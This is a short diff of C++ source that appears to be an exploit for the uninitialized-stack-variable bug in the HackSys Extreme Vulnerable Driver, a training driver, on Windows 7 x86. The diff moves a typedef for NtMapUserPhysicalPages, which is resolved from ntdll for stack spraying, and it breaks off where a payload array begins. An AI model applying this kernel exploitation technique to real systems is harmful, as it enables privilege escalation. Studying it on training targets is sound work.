@@ -1,6 +1,3 @@
-// HEVD-UninitializedStackVariableWin7x86.cpp : Defines the entry point for the console application.
-//
-
 #include "stdafx.h"
 #include <Windows.h>
 #include <string.h>
@@ -8,12 +5,6 @@
 #include <winioctl.h>
 #include <stdint.h>
 #include <malloc.h>
-
-typedef NTSTATUS(__stdcall *_NtMapUserPhysicalPages)(
-	PINT BaseAddress,
-	UINT32 NumberOfPages,
-	PBYTE PageFrameNumbers
-);
 
 int main()
 {
@@ -31,8 +22,14 @@ int main()
 
 	char Buff[20] = "\xDD\xDD\xDD\xDD";
 	DWORD outBytes = 0;
+	
+	typedef NTSTATUS(__stdcall *pfNtMapUserPhysicalPages)(
+		PINT BaseAddress,
+		UINT32 NumberOfPages,
+		PBYTE PageFrameNumbers
+	);
 
-	_NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)GetProcAddress(
+	pfNtMapUserPhysicalPages NtMapUserPhysicalPages = (pfNtMapUserPhysicalPages)GetProcAddress(
 		GetModuleHandleW(L"ntdll.dll"), "NtMapUserPhysicalPages");
 
 	char pl[60] =
